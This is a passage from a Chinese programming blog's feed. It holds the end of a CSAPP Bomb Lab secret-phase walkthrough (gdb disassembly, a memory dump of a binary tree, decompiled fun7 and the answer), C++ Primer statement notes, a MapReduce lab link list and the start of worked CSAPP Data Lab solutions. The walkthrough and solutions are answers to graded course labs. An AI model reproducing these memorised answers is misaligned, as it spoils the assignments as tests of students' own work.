class="number">33</span>&gt;:    cmp    edx,esi</span><br><span class="line">   <span class="number">0x0000000000401227</span> &lt;+<span class="number">35</span>&gt;:    je     <span class="number">0x40123d</span> &lt;fun7+<span class="number">57</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401229</span> &lt;+<span class="number">37</span>&gt;:    mov    rdi,QWORD PTR [rdi+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x000000000040122d</span> &lt;+<span class="number">41</span>&gt;:    call   <span class="number">0x401204</span> &lt;fun7&gt;</span><br><span class="line">   <span class="number">0x0000000000401232</span> &lt;+<span class="number">46</span>&gt;:    lea    eax,[rax+rax*<span class="number">1</span>+<span class="number">0x1</span>]</span><br><span class="line">   <span class="number">0x0000000000401236</span> &lt;+<span class="number">50</span>&gt;:    jmp    <span class="number">0x40123d</span> &lt;fun7+<span class="number">57</span>&gt;</span><br><span class="line">---------------------------- 如果rdi == <span class="number">0</span> 就返回<span class="number">0xffffffff</span></span><br><span class="line">   <span class="number">0x0000000000401238</span> &lt;+<span class="number">52</span>&gt;:    mov    eax,<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040123d</span> &lt;+<span class="number">57</span>&gt;:    add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000401241</span> &lt;+<span class="number">61</span>&gt;:    ret</span><br><span class="line">End of assembler dump</span><br></pre></td></tr></table></figure><p>secret中将0x6030f0传给rdi，rdi为函数的第一个参数，可以查看下0x6030f0的内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">80</span>gx <span class="number">0x6030f0</span></span><br><span class="line"><span class="number">0x6030f0</span> &lt;n1&gt;:  <span class="number">0x0000000000000024</span>      <span class="number">0x0000000000603110</span></span><br><span class="line"><span class="number">0x603100</span> &lt;n1+<span class="number">16</span>&gt;:       <span class="number">0x0000000000603130</span>      <span class="number">0x00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0x603110</span> &lt;n21&gt;: <span class="number">0x0000000000000008</span>      <span class="number">0x0000000000603190</span></span><br><span class="line"><span class="number">0x603120</span> &lt;n21+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603150</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603130</span> &lt;n22&gt;: <span class="number">0x0000000000000032</span>      <span class="number">0x0000000000603170</span></span><br><span class="line"><span class="number">0x603140</span> &lt;n22+<span class="number">16</span>&gt;:      <span class="number">0x00000000006031b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603150</span> &lt;n32&gt;: <span class="number">0x0000000000000016</span>      <span class="number">0x0000000000603270</span></span><br><span class="line"><span class="number">0x603160</span> &lt;n32+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603230</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603170</span> &lt;n33&gt;: <span class="number">0x000000000000002d</span>      <span class="number">0x00000000006031d0</span></span><br><span class="line"><span class="number">0x603180</span> &lt;n33+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603290</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603190</span> &lt;n31&gt;: <span class="number">0x0000000000000006</span>      <span class="number">0x00000000006031f0</span></span><br><span class="line"><span class="number">0x6031a0</span> &lt;n31+<span class="number">16</span>&gt;:      <span class="number">0x0000000000603250</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031b0</span> &lt;n34&gt;: <span class="number">0x000000000000006b</span>      <span class="number">0x0000000000603210</span></span><br><span class="line"><span class="number">0x6031c0</span> &lt;n34+<span class="number">16</span>&gt;:      <span class="number">0x00000000006032b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031d0</span> &lt;n45&gt;: <span class="number">0x0000000000000028</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031e0</span> &lt;n45+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6031f0</span> &lt;n41&gt;: <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603200</span> &lt;n41+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603210</span> &lt;n47&gt;: <span class="number">0x0000000000000063</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603220</span> &lt;n47+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603230</span> &lt;n44&gt;: <span class="number">0x0000000000000023</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603240</span> &lt;n44+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603250</span> &lt;n42&gt;: <span class="number">0x0000000000000007</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603260</span> &lt;n42+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603270</span> &lt;n43&gt;: <span class="number">0x0000000000000014</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603280</span> &lt;n43+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603290</span> &lt;n46&gt;: <span class="number">0x000000000000002f</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032a0</span> &lt;n46+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032b0</span> &lt;n48&gt;: <span class="number">0x00000000000003e9</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032c0</span> &lt;n48+<span class="number">16</span>&gt;:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:       <span class="number">0x000000010000014c</span>      <span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:       <span class="number">0x00000002000000a8</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:       <span class="number">0x000000030000039c</span>      <span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:       <span class="number">0x00000004000002b3</span>      <span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:       <span class="number">0x00000005000001dd</span>      <span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:       <span class="number">0x00000006000001bb</span>      <span class="number">0x0000000000</span></span><br></pre></td></tr></table></figure><p>可以猜测这里存放着二叉树，结构可能为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">long</span> val;           </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *l,*r; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 每个node后补了8个字节，可能是为了内存对齐</span></span><br></pre></td></tr></table></figure><p>可以根据这些n画出完整的二叉树，但人工画有点麻烦，不如先思考怎样得到所需的返回值2。</p><p>IDA反编译代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">fun7</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 &gt; (<span class="type">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">fun7</span>(*(_QWORD *)(a1 + <span class="number">8</span>), a2);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 != (_DWORD)a2 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">fun7</span>(*(_QWORD *)(a1 + <span class="number">16</span>), a2) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1(rdi)其实是二叉树的根，a1+8对应左子树，a1+16对应右子树。</p><p>若访问到空节点，则返回值会出现<code>0xffffffff</code>，所以我们只能在树上（软件原因树的最右分枝未补全）的节点选择。通过代码我们知道，若从节点<code>x</code>出发<code>result</code>初始值为<code>0</code>，若改节点为右儿子则<code>a=2*a+1</code>、为左儿子则<code>a=a*2</code>。</p><p>由于2 = 2 * 1，所以需要的节点x满足，x是其父节点y的右儿子，y是根节点a1（rsi）的左儿子。</p><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%204.png" alt="Untitled"></p><p>所以输入20（或者0x603150的左儿子）就行。</p><h1 id="笔记">笔记</h1><ul><li>不小心按ctrl-z把进程suspend了，可以使用<code>jobs</code>查询当前工作，然后<code>fg N (bash)</code> 或 <code>fg %N(zsh)</code> 将任务从后台转入前台</li></ul><h1 id="参考资料">参考资料</h1><ul><li>Introduction to CSAPP（十九）：这可能是你能找到的分析最全的Bomblab了 - Yannick的文章 - 知乎<a href="https://zhuanlan.zhihu.com/p/104130161">https://zhuanlan.zhihu.com/p/104130161</a></li><li>《深入理解计算机系统/CSAPP》Bomb Lab - 上岸改名了的文章 - 知乎<a href="https://zhuanlan.zhihu.com/p/57977157">https://zhuanlan.zhihu.com/p/57977157</a></li><li><a href="https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/">https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章 语句</title>
      <link href="/2023/05/24/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch05/"/>
      <url>/2023/05/24/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch05/</url>
      
        <content type="html"><![CDATA[<h2 id="简单语句">简单语句</h2><ul><li><strong>表达式语句</strong>：一个表达式末尾加上分号，就变成了表达式语句。</li><li><strong>空语句</strong>：只有一个单独的分号。</li><li><strong>复合语句（块）</strong>：用花括号 <code>&#123;&#125;</code>包裹起来的语句和声明的序列。一个块就是一个作用域。</li></ul><h2 id="条件语句">条件语句</h2><ul><li><strong>悬垂else</strong>（dangling else）：用来描述在嵌套的<code>if else</code>语句中，如果<code>if</code>比<code>else</code>多时如何处理的问题。C++使用的方法是<code>else</code>匹配最近没有配对的<code>if</code>。</li></ul><h2 id="迭代语句">迭代语句</h2><ul><li><strong>while</strong>：当不确定到底要迭代多少次时，使用 <code>while</code>循环比较合适，比如读取输入的内容。</li><li><strong>for</strong>： <code>for</code>语句可以省略掉 <code>init-statement</code>， <code>condition</code>和 <code>expression</code>的任何一个；<strong>甚至全部</strong>。</li><li><strong>范围for</strong>： <code>for (declaration: expression) statement</code></li></ul><h2 id="跳转语句">跳转语句</h2><ul><li><strong>break</strong>：<code>break</code>语句负责终止离它最近的<code>while</code>、<code>do while</code>、<code>for</code>或者<code>switch</code>语句，并从这些语句之后的第一条语句开始继续执行。</li><li><strong>continue</strong>：终止最近的循环中的当前迭代并立即开始下一次迭代。只能在<code>while</code>、<code>do while</code>、<code>for</code>循环的内部。</li></ul><h2 id="try语句块和异常处理">try语句块和异常处理</h2><ul><li><strong>throw表达式</strong>：异常检测部分使用 <code>throw</code>表达式来表示它遇到了无法处理的问题。我们说 <code>throw</code>引发 <code>raise</code>了异常。</li><li><strong>try语句块</strong>：以 <code>try</code>关键词开始，以一个或多个 <code>catch</code>字句结束。 <code>try</code>语句块中的代码抛出的异常通常会被某个 <code>catch</code>捕获并处理。 <code>catch</code>子句也被称为<strong>异常处理代码</strong>。</li><li><strong>异常类</strong>：用于在 <code>throw</code>表达式和相关的 <code>catch</code>子句之间传递异常的具体信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lab 1 MapReduce</title>
      <link href="/2023/05/21/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-lab1-MapReduce-Copy/"/>
      <url>/2023/05/21/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-lab1-MapReduce-Copy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程网址：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">https://pdos.csail.mit.edu/6.824/schedule.html</a><br>以下内容来自课程课件，由于课件纯文本显示效果不佳，故对其排版整理并添加了部分个人笔记批注。</p></blockquote><ul><li></li></ul><p>![image-20231008222058868](./lab1_MapReduce - Copy/image-20231008222058868.png)</p><ul><li></li></ul><h1 id="参考资料">参考资料</h1><ul><li><p>【mit6.824分布式lab1-MapReduce（2）】 <a href="https://www.bilibili.com/video/BV1EZ4y1i7bX/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f">https://www.bilibili.com/video/BV1EZ4y1i7bX/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f</a></p></li><li><p><a href="https://blog.csdn.net/qq_35102066/article/details/110678699?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_35102066/article/details/110678699?spm=1001.2014.3001.5501</a></p></li><li><p><a href="https://blog.csdn.net/qq_44766883/article/details/124475672">https://blog.csdn.net/qq_44766883/article/details/124475672</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/260752052">https://zhuanlan.zhihu.com/p/260752052</a></p></li><li><p><a href="https://blog.rayzhang.top/2022/10/29/mit-6.824-lab1-mapreduce/index.html">https://blog.rayzhang.top/2022/10/29/mit-6.824-lab1-mapreduce/index.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> MIT6.5840 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式系统 </tag>
            
            <tag> MIT6.5840讲义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP - Data Lab 详解</title>
      <link href="/2023/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l1-datalab/"/>
      <url>/2023/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l1-datalab/</url>
      
        <content type="html"><![CDATA[<p><a href="http://csapp.cs.cmu.edu/im/labs/datalab.tar"><em>Data Lab</em></a> <em><strong>[Updated 12/16/19]</strong></em> (<a href="http://csapp.cs.cmu.edu/3e/README-datalab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/datalab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/datalab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/datalab-handout.tar">Self-Study Handout</a>)</p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><p>实验作业网址：<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><hr><h1 id="前言">前言</h1><p>本篇博客将会剖析 CSAPP - DataLab 各个习题的解题过程，加深对 int、unsigned、float 这几种数据类型的计算机表示方式的理解。</p><p>DataLab 中包含下表所示的 12 个习题，其中 9 个和整数有关，3个和单精度浮点数有关。</p><table><thead><tr><th style="text-align:center">函数名</th><th style="text-align:center">功能描述</th><th style="text-align:center">分数</th><th style="text-align:center">操作符</th></tr></thead><tbody><tr><td style="text-align:center">bitXor(x, y)</td><td style="text-align:center">使用 &amp; 和 ~ 实现异或操作</td><td style="text-align:center">1</td><td style="text-align:center">14</td></tr><tr><td style="text-align:center">tmin()</td><td style="text-align:center">补码的最小值</td><td style="text-align:center">1</td><td style="text-align:center">14</td></tr><tr><td style="text-align:center">isTmax(x)</td><td style="text-align:center">x 是否为补码的最大值</td><td style="text-align:center">1</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">allOddBits(x)</td><td style="text-align:center">x 的奇数位是否全为 1</td><td style="text-align:center">2</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">negate(x)</td><td style="text-align:center">不使用 - 计算 x 的相反数</td><td style="text-align:center">2</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">isAsciDigit(x)</td><td style="text-align:center">x 是否在 [0x30, 0x39] 区间内</td><td style="text-align:center">3</td><td style="text-align:center">15</td></tr><tr><td style="text-align:center">conditional</td><td style="text-align:center">实现条件运算符，x ? y : z</td><td style="text-align:center">3</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">isLessOrEqual(x, y)</td><td style="text-align:center">x 是否小于等于 y</td><td style="text-align:center">3</td><td style="text-align:center">24</td></tr><tr><td style="text-align:center">logicalNeg(x)</td><td style="text-align:center">不使用 ! 计算逻辑非</td><td style="text-align:center">4</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">howManyBits(x)</td><td style="text-align:center">表示 x 的最少补码位数</td><td style="text-align:center">4</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">floatScale2(uf)</td><td style="text-align:center">计算无符号数 uf 所表示的浮点数的 2 倍值</td><td style="text-align:center">4</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">floatFloat2Int(uf)</td><td style="text-align:center">将无符号数 uf 所表示的浮点数转为整数</td><td style="text-align:center">4</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">floatPower2(x)</td><td style="text-align:center">计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>×</mo><msup><mn>2</mn><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">2\times 2^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">4</td><td style="text-align:center">30</td></tr></tbody></table><h1 id="bitXor">bitXor</h1><p>思路：先使用<code>&amp;</code>、<code>|</code>、<code>~</code>进行表示，然后利用DeMorgan律去替换掉不能使用的位运算。</p><p>先画出真值表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x y  x^y</span><br><span class="line">0 0   0</span><br><span class="line">0 1   1</span><br><span class="line">1 0   1</span><br><span class="line">1 1   0</span><br><span class="line"></span><br><span class="line">x y  x|y</span><br><span class="line">0 0   0</span><br><span class="line">0 1   1</span><br><span class="line">1 0   1</span><br><span class="line">1 1   1</span><br><span class="line"></span><br><span class="line">x y  x&amp;y</span><br><span class="line">0 0   0</span><br><span class="line">0 1   0</span><br><span class="line">1 0   0</span><br><span class="line">1 1   1</span><br></pre></td></tr></table></figure><h2 id="思路1：看什么情况得到1">思路1：看什么情况得到1</h2><p>“x为0，y为1“或”x为1，y为0”即可：<code>x^y = (x&amp;~y) | (~x&amp;y)</code></p><p>根据DeMorgan律：<code>x|y = ~(~x &amp; ~y)</code></p><p>即 <code>x^y = (x&amp;~y) | (~x&amp;y) = ~(~(x&amp;~y) &amp; ~(~x&amp;y))</code></p><h2 id="思路2：排除掉得到0的情况">思路2：排除掉得到0的情况</h2><p>只要x、y不同时为0，或同时为1就行：<code>x^y = ~(~x&amp;~y) &amp; ~(x&amp;y)</code></p><h2 id="思路3：-和-像，再用-x-y-加掩码">思路3：^和|像，再用~(x&amp;y)加掩码</h2><p><code>x^y = x|y &amp; ~(x&amp;y)</code></p><p>利用DeMorgan律，得<code>x^y = ~(~x&amp;~y) &amp; ~(x&amp;y)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// return ~(~(x&amp;~y) &amp; ~(~x&amp;y));  // 思路1, 8次op</span></span><br><span class="line">  <span class="keyword">return</span> ~(x&amp;y) &amp; ~(~x&amp;~y);  <span class="comment">// 思路2和3，7次op</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Tmin">Tmin</h1><p>Tmin形如1000000000，可通过移位表示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">tmin</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x80</span> &lt;&lt; <span class="number">24</span>;  <span class="comment">// 把高位的24位移掉</span></span><br><span class="line">  <span class="comment">// return 0x01 &lt;&lt; 31;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isTmax">isTmax</h1><p>Tmax形如0111111…111，特点：<strong>~(Tmax+1)=Tmax</strong>，可通过这个性质判断</p><p>但是Umax = 1111111…111也满足 ~(Umax+1)=Umax，需要排除</p><p>二者不同在于Tmax+1不为0，而<strong>Umax+1等于0</strong>，”是否等于0“可以通过<code>!!</code>转化为布尔类型，否则直接&amp;的话不对喔。</p><blockquote><p>💡通过 <code>!(x ^ y)</code> 判断是否相等<br>通过 <code>!</code> 或 <code>!!</code> 将结果转化为bool类型</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isTmax</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~(x+<span class="number">1</span>))^x) &amp; !!(x+<span class="number">1</span>);  <span class="comment">// 8ops</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="addOddBits">addOddBits</h1><p>首先产生1010…1010 即 0xAAAAAAAA 形式的掩码，对x的奇数位进行提取，然后判断提取结果是否为0xAAAAAAAA。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> AA = <span class="number">0xAA</span>;</span><br><span class="line">  <span class="type">int</span> AAAA = AA &lt;&lt; <span class="number">8</span> | AA;</span><br><span class="line">  <span class="type">int</span> AAAAAAAA = AAAA &lt;&lt; <span class="number">16</span> | AAAA;</span><br><span class="line">  <span class="keyword">return</span> !((x &amp; AAAAAAAA) ^ AAAAAAAA);  <span class="comment">// 7ops</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="negate">negate</h1><blockquote><p>💡 求负：逐位取反再加1</p></blockquote><p><img src="/2023/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l1-datalab/Untitled.png" alt="Untitled"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">negate</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span 